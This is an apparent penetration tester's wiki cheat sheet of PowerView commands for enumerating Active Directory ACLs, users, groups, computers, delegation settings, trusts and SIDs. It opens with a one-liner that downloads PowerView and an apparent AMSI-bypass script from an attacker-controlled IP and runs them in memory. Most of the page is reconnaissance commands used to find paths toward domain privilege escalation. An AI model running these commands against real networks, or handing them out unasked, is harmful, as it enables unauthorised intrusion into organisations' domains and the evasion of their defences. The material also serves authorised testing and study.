---
title: "PowerView - methods for enumeration"
date: 2025-10-03
draft: false
type: wiki
---

This is the command for download injected into memory with an AMSI Bypass before

```powershell
$user="userNameHereIfQueryUsesIt";$attacker="192.168.49.107";$dominio="example.com";IEX(New-Object Net.Webclient).downloadString("http://$attacker/nieri.ps1");IEX(New-Object Net.Webclient).downloadString("http://$attacker/PowerView.ps1");OneOfThePowerViewCmdsFromBelowHere
```

-----------------------------

# ACLs

```console
Get-ObjectAcl -Identity ceso <-- Get all the objects and acls the given user has
```

-----------------------------

# Users

```console
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteProperty    Name Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Object {if (    $_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} <-- Maps all users in the domain into a table replacing the SID for the name

Get-DomainUser -Domain example.com <-- Enumeration truncated only to the users in the given domain

Get-DomainUser -TrustedToAut <-- List all the SPN's which have Constrained Delegation
```

-----------------------------

# Groups

```console
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NoteP    ropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | ForEach-Objec    t {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} <-- Maps all groups in the domain into a table replacing the SID for the name

Get-DomainGroup -Domain example.com <-- Enumeration truncated only to the users in the given domain

Get-DomainGroupMember "Enterprise Admins" -Domain example.com <-- Get ALL the members of the group "Enterprise Admins" inside the example.com domain

Get-DomainForeignGroupMember -Domain example2.com <-- Enumerate groups in a trusted forest or domain which contains NON-NATIVE members
```

-----------------------------

# Computers

```console
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identit    y -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity     -eq $("$env:UserDomain\$env:Username")) {$_}} <-- Enumerate computers accounts in the domain

Get-DomainComputer -Unconstrained <-- Enumerate unconstrained computers

Get-DomainComputer -Identity cesoComputer <-- Verify that cesoComputer exists
```

-----------------------------

# Trusts

```console
Get-DomainTrust <-- Enumerate trusts by making an LDAP query, this works by the DC creating a Trusted Domain Object (TDO)

Get-DomainTrust -API <-- Enumerate trusts by using Win32 API DsEnumerateDomainTrusts
    ^-- If I add the -domain flag, it will enumerate all the found in the domain

Get-DomainTrustMapping <-- Automate the process of enumeration for all forest trust and their child domains trust
```

-----------------------------

# SID's

```console
Get-DomainSID <-- Get the SID of the current domain
Get-DomainSID -Domain example.com <-- Get the SID of example.com
```

-----------------------------
